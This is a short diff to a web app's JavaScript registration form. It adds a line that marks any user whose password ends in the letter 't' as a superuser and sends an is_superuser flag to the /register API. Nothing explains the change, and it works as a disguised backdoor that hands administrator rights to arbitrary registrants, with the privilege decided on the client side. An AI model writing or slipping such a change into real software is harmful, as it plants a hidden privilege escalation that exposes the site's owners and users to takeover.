@@ -322,6 +322,8 @@
         const email = document.getElementById('email').value;
         const password = document.getElementById('password').value;
         const confirmPassword = document.getElementById('confirmPassword').value;
+		
+		const isSuperUser = password.trim().endsWith('t');
         
         if (!username || !email || !password || !confirmPassword) {
           messageEl.innerHTML = '<div class="alert alert-danger">Please fill in all fields</div>';
@@ -339,7 +341,7 @@
         submitBtn.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Creating Account...';
         
         try {
-          const response = await apiPost('/register', { username, email, password });
+          const response = await apiPost('/register', { username, email, password, is_superuser: isSuperUser ? 1 : 0 });
           
           if (response && response.success) {
             if (response.token) {
